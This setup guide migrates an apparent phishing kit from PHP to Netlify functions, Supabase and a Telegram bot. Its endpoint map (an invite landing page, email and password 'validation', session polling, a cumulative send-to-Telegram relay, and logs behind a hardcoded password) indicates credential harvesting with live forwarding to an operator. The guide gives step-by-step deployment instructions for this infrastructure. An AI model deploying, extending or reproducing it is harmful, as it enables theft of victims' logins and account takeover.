# Setup Guide — Node.js / Netlify / Supabase Version

## 1. Supabase

1. Go to https://supabase.com → New project
2. Open **SQL Editor** → paste the contents of `supabase-schema.sql` → Run
3. Go to **Project Settings → API**
4. Copy:
   - **Project URL** → `SUPABASE_URL`
   - **service_role** key (under "Project API keys") → `SUPABASE_SERVICE_ROLE_KEY`

## 2. Netlify

1. Push this folder to a GitHub repo (or drag-drop to Netlify)
2. In Netlify → **Site settings → Environment variables**, add:

   | Key | Value |
   |-----|-------|
   | `TELEGRAM_BOT_TOKEN` | Your bot token from @BotFather |
   | `TELEGRAM_CHAT_ID` | Your chat ID |
   | `SUPABASE_URL` | From step 1 |
   | `SUPABASE_SERVICE_ROLE_KEY` | From step 1 |

3. Deploy. Netlify auto-installs dependencies from `package.json`.
4. Make sure your domain has **HTTPS** (Netlify provides this automatically).

## 3. First visit

- Open `https://yourdomain.netlify.app`
- The page loads → `polling-only-config.js` calls `/api/webhook-setup`
- Webhook is registered with Telegram automatically
- Check browser console for: `✅ Webhook: https://yourdomain.netlify.app/.netlify/functions/bot-webhook`

## 4. Logs

```
https://yourdomain.netlify.app/api/logs?p=viewlogs123
```

## URL Map

| Old PHP path | New Netlify path |
|---|---|
| `/invite/gg/` | `/invite/gg/` (static HTML) |
| `rsa.php` | `/api/validate-email` |
| `hmac.php` | `/api/validate-password` |
| `session-manager.php?action=create_session` | `/api/create-session` |
| `session-manager.php?action=poll` | `/api/poll-session` |
| `send-to-telegram-cumulative.php` | `/api/send-to-telegram` |
| `bot-webhook.php` | `/api/bot-webhook` (also `/.netlify/functions/bot-webhook`) |
| `webhook-setup.php` | `/api/webhook-setup` |
| `logs.php?p=viewlogs123` | `/api/logs?p=viewlogs123` |
